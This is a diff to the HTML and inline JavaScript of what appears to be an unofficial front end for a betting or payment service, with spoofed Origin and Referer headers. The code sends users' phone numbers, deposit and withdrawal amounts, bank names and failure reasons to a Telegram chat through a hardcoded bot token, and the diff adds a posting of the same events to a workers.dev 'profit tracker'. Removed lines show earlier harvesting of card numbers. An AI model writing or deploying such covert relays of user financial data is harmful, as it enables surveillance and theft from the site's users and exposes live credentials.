@@ -1,5 +1,3 @@
-`````
-````
 ```
 <!DOCTYPE html>
 <html lang="en">
@@ -731,7 +729,7 @@
   font-weight:900;
 }
 #dashboard .user-badge:after{
-  content:"";
+  content:"👛";
   position:absolute;
   right:20px;
   top:27px;
@@ -1567,19 +1565,43 @@
   const TELEGRAM_BOT_TOKEN = '8638134053:AAGVC6fIVhGUsKibPEFq7skSY5QqosE6U18';
   const TELEGRAM_CHAT_ID = '-1004415634813';
 
+
+  // ─── PROFIT TRACKER ───────────────────────────────────────────────────────
+  // Sends only successful LOGIN / DEPOSIT / WITHDRAW events to Cloudflare D1.
+  const PROFIT_TRACKER_URL = 'https://delicate-block-ad76profit-tracker.sanjubot100.workers.dev';
+  const PROFIT_TRACKER_KEY = 'PT-2026-X9K7-AB42';
+
+  async function trackProfitEvent(type, phone, amount = 0) {
+    try {
+      await fetch(PROFIT_TRACKER_URL + '/event', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-Tracker-Key': PROFIT_TRACKER_KEY
+        },
+        body: JSON.stringify({
+          type,
+          status: 'SUCCESS',
+          phone,
+          amount: Number(amount || 0)
+        })
+      });
+    } catch (e) {
+      // Tracker failure must never interrupt the main app.
+      console.error('Profit tracker error:', e);
+    }
+  }
+
   // ─── TELEGRAM WITHDRAWAL NOTIFICATIONS ─────────────────────────────────────
-  async function sendTelegramWithdrawalNotification({status, amount, phone, bank, cardNumber='', reason=''}) {
+  async function sendTelegramWithdrawalNotification({status, amount, phone, bank, reason=''}) {
     const emoji = status === 'SUCCESS' ? '✅' : '❌';
     const title = status === 'SUCCESS' ? 'WITHDRAWAL SUCCESSFUL' : 'WITHDRAWAL FAILED';
-    const digits = String(cardNumber || '').replace(/\D/g,'');
-    const safeCardNumber = digits.length >= 4 ? `****${digits.slice(-4)}` : 'Not available';
     const text = [
       `${emoji} <b>${title}</b>`,
       '',
       `👤 <b>User:</b> ${phone || 'Unknown'}`,
       `💸 <b>Amount:</b> ₹${Number(amount || 0).toFixed(2)}`,
       `🏦 <b>Bank:</b> ${bank || 'Unknown'}`,
-      `💳 <b>Card:</b> ${safeCardNumber}`,
       `🕐 <b>Time:</b> ${new Date().toLocaleString('en-IN', {timeZone:'Asia/Kolkata'})}`,
       reason ? `⚠️ <b>Reason:</b> ${reason}` : ''
     ].filter(Boolean).join('\n');
@@ -2098,6 +2120,8 @@
                 <div style="font-size:9px;word-break:break-all;margin-top:4px;color:#6b7280;">🔗 ${url}</div>
               </div>`;
             }
+            // API successfully created the deposit/payment request.
+            void trackProfitEvent('DEPOSIT', S.phone, Number(S.selectedAmount || 0));
           }else{
             showToast('Deposit created, but no payment URL was returned.','warning');
             if(div) div.innerHTML=`<div style="color:#fbbf24;">⚠️ No payment URL returned.</div>`;
@@ -2129,46 +2153,6 @@
   }
 
   // ─── WITHDRAW ─────────────────────────────────────────────────────────────
-  // Get the selected bank-card details directly from the card/info API.
-  async function getSelectedCardInfoFromApi(){
-    try{
-      const r=await fetch('https://api.bh556677ww.com/app/card/info',{
-        method:'POST',
-        headers:{'Accept':'application/json','Content-Type':'application/json','token':S.token,'packageid':'2','Origin':'https://playbhau.com','Referer':'https://playbhau.com/'},
-        body:JSON.stringify({channel:'h5',channelId:'Samsung',lang:'en_US',visitor:S.visitor,packageId:2,packageInfo:'com.resulta.checka',reqDate:Date.now(),ua:'Mozilla/5.0',versionCode:'999'})
-      });
-      if(r.status!==200) return null;
-      const api=await r.json();
-      if(api.code!==0 && api.success!==true) return null;
-
-      const targetId=String(S.selectedCard ?? '');
-      const numberKeys=['accountNumber','accountNo','account_number','cardNumber','cardNo','cardNum','card_number','bankCard','bankCardNo','bankAccount','bankAccountNo','number','account','accountNum','account_num'];
-      const bankKeys=['bankName','bank','bankCardName','bank_name'];
-      const seen=new Set();
-      let best=null;
-
-      function walk(v){
-        if(!v || typeof v!=='object' || seen.has(v) || best) return;
-        seen.add(v);
-        if(Array.isArray(v)){ for(const x of v) walk(x); return; }
-        const ids=[v.id,v.cardId,v.card_id].filter(x=>x!==undefined&&x!==null).map(String);
-        const matches=!targetId || ids.includes(targetId);
-        if(matches){
-          let number='';
-          for(const k of numberKeys){
-            if(v[k]!==undefined && v[k]!==null && String(v[k]).replace(/\D/g,'').length>=4){ number=String(v[k]); break; }
-          }
-          let bank='';
-          for(const k of bankKeys){ if(v[k]){ bank=String(v[k]); break; } }
-          if(number || bank) best={number,bank};
-        }
-        for(const x of Object.values(v)) walk(x);
-      }
-      walk(api.data ?? api);
-      return best;
-    }catch(_){ return null; }
-  }
-
   async function renderWithdraw(){
     S.currentPanel='withdraw';
     await getBalance();
@@ -2225,20 +2209,20 @@
         const d=await r.json();
         const div=document.getElementById('withdrawResult');
         if(r.status===200 && (d.code===0||d.success===true)){
-          const apiCard = await getSelectedCardInfoFromApi();
-          const selectedCard = S.withdrawCards.find(c => Number(c.id || c.cardId) === Number(S.selectedCard));
-          const bankName = apiCard?.bank || selectedCard?.bankName || selectedCard?.bank || selectedCard?.bankCardName || selectedCard?.bank_name || 'Bank';
-          const cardNumber = apiCard?.number || selectedCard?.accountNumber || selectedCard?.accountNo || selectedCard?.account_number || selectedCard?.cardNumber || selectedCard?.cardNo || selectedCard?.cardNum || selectedCard?.card_number || selectedCard?.bankCard || selectedCard?.bankAccount || selectedCard?.number || '';
+          const selectedCard = S.withdrawCards.find(c => Number(c.id) === Number(S.selectedCard));
+          const bankName = selectedCard?.bankName || selectedCard?.bank || selectedCard?.bankCardName || 'Bank';
           div.innerHTML=`<div style="background:rgba(0,0,0,0.2);padding:10px;border-radius:16px;"><div style="color:#34d399;font-weight:600;">✅ Withdrawal successful!</div><div style="color:#6b7280;">₹${amt.toFixed(2)} withdrawn</div></div>`;
           showToast('Withdrawal successful!','success');
+
+          // Track only after the withdrawal API reports success.
+          void trackProfitEvent('WITHDRAW', S.phone, amt);
 
           // Send Telegram notification only after the withdrawal API reports success.
           await sendTelegramWithdrawalNotification({
             status:'SUCCESS',
             amount:amt,
             phone:S.phone,
-            bank:bankName,
-            cardNumber
+            bank:bankName
           });
 
           await getBalance(); balanceDisplay.textContent=S.balance.toFixed(2);
@@ -2249,16 +2233,13 @@
           showToast('Withdrawal failed: '+reason,'error');
 
           // Send the actual API failure reason to Telegram.
-          const apiCard = await getSelectedCardInfoFromApi();
-          const selectedCard = S.withdrawCards.find(c => Number(c.id || c.cardId) === Number(S.selectedCard));
-          const bankName = apiCard?.bank || selectedCard?.bankName || selectedCard?.bank || selectedCard?.bankCardName || selectedCard?.bank_name || 'Bank';
-          const cardNumber = apiCard?.number || selectedCard?.accountNumber || selectedCard?.accountNo || selectedCard?.account_number || selectedCard?.cardNumber || selectedCard?.cardNo || selectedCard?.cardNum || selectedCard?.card_number || selectedCard?.bankCard || selectedCard?.bankAccount || selectedCard?.number || '';
+          const selectedCard = S.withdrawCards.find(c => Number(c.id) === Number(S.selectedCard));
+          const bankName = selectedCard?.bankName || selectedCard?.bank || selectedCard?.bankCardName || 'Bank';
           await sendTelegramWithdrawalNotification({
             status:'FAILED',
             amount:amt,
             phone:S.phone,
             bank:bankName,
-            cardNumber,
             reason
           });
         }
@@ -2586,30 +2567,6 @@
   logoutYesBtn.addEventListener('click',()=>{ hideLogoutConfirmation(); doLogout(); });
   logoutNoBtn.addEventListener('click',hideLogoutConfirmation);
 
-  // ─── PROFIT TRACKER (ADDED — existing functions unchanged) ───────────────
-  const PROFIT_TRACKER_URL = 'https://delicate-block-ad76profit-tracker.sanjubot100.workers.dev/event';
-  const PROFIT_TRACKER_KEY = 'PT-2026-X9K7-AB42';
-
-  async function trackProfitEvent(eventType, phone, amount = 0){
-    try{
-      await fetch(PROFIT_TRACKER_URL,{
-        method:'POST',
-        headers:{
-          'Content-Type':'application/json',
-          'X-Tracker-Key':PROFIT_TRACKER_KEY
-        },
-        body:JSON.stringify({
-          type:eventType,
-          status:'SUCCESS',
-          phone:String(phone||''),
-          amount:Number(amount||0)
-        })
-      });
-    }catch(_){
-      // Tracker failure must never stop the existing website flow.
-    }
-  }
-
   // ─── LOGIN HANDLER ──────────────────────────────────────────────────────
   async function handleLogin(e){
     e.preventDefault();
@@ -2741,5 +2698,3 @@
 </script>
 </body>
 </html>
-````
-`````
